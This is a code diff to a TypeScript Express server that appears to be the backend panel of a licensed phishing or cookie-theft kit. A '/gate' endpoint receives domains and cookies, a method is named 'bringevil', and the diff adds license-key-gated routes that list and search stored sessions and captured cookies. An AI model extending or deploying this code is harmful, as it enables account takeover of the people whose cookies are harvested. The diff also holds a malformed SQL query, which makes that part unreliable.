@@ -20,6 +20,7 @@ export class App {
   public detectedIp: any;
   public salty: String;
   public contain: any;
+  public db: any = new sqlite3.Database('./history.db');
     constructor() {
         this.locker = new Locker();
         this.logger = new Logger();
@@ -27,7 +28,7 @@ export class App {
         this.loader = new Loader();
         this.loader.bannerMessage();
         this.detectedIp = this.loader.findIp();
-        app.use(cors())
+        app.use(cors());
         app.use(bodyParser.urlencoded({
             extended: false
         }));
@@ -38,11 +39,7 @@ export class App {
                 console.log('[!] Instance User:'+this.conf.instanceUser);
                 console.log('[!] License Key:'+this.conf.licenseKey);
                 this.locker.verify(this.conf);
-                if (!this.conf.randomName){
-                  this.salty=""+this.conf.instanceUser;
-                } else {
-                  this.salty= this.loader.randomString();
-                }
+                this.salty=""+this.conf.instanceUser;
                 this.generator.populate(JSON.parse(jsonString),this.salty);
                 this.bringevil();
                 this.logger.initDb();
@@ -145,8 +142,8 @@ export class App {
                            <td>`+'asd'+`</td>
                            </tr>
                            </table>
-                   `);
-          res.end();
+                   `)
+                   res.end();
         });
         app.get('/'+this.conf.licenseKey+'/help',(req,res)=>{
           res.send(`<style>
@@ -312,37 +309,44 @@ export class App {
             res.end();
         });
         app.get('/'+this.conf.licenseKey+'/session/list',(req,res)=>{
-            const db  = new sqlite3.Database('./history.db', sqlite3.OPEN_READWRITE);
             const sql = "SELECT * FROM session";
-            db.all(sql, [], function(err, rows) {
+            this.db.all(sql, [], function(err, rows) {
               if (err) {
                 console.log(err);
               }
-              console.log(rows);
-            });
-            //res.send('<h2> address 1: '+rows+'</h2>');
-            res.end();
+              res.json({
+                         "message":"success",
+                         "data":rows
+                     });
+              });
         });
         app.get('/'+this.conf.licenseKey+'/info/list',(req,res)=>{
-          try {
-            const db  = new sqlite3.Database('./history.db', sqlite3.OPEN_READWRITE);
-            const sql = "SELECT * FROM info";
-            const result = db.run(sql, []);
-            console.log(result);
-            res.send(result);
-          } catch (err) {
-              return console.error(err);
+          const sql = "SELECT * FROM info";
+          this.db.all(sql, [], function(err, rows) {
+            if (err) {
+              console.log(err);
             }
-            res.end();
+            res.json({
+                       "message":"success",
+                       "data":rows
+                   });
+            });
         });
         app.get('/'+this.conf.licenseKey+'/db/clear',(req,res)=>{
 
         });
-        app.get('/'+this.conf.licenseKey+'/get/address/:addressname',(req,res)=>{
-
-        });
-        app.get('/'+this.conf.licenseKey+'/get/keyword/:keywordname',(req,res)=>{
-
+        app.get('/'+this.conf.licenseKey+'/search/info/:keywordname',(req,res)=>{
+          const sql = "SELECT chunks AND cookie FROM info WHERE address=? ";
+          this.db.all(sql, [req.params.keywordname], function(err, rows) {
+            if (err) {
+              res.send('No result found');
+            }
+            console.log(rows);
+            res.json({
+                       "message":"success",
+                       "data":rows
+                   });
+            });
         });
         app.post('/gate',(req,res)=>{
           if (req.body.domain === null && req.body.cookie === null){
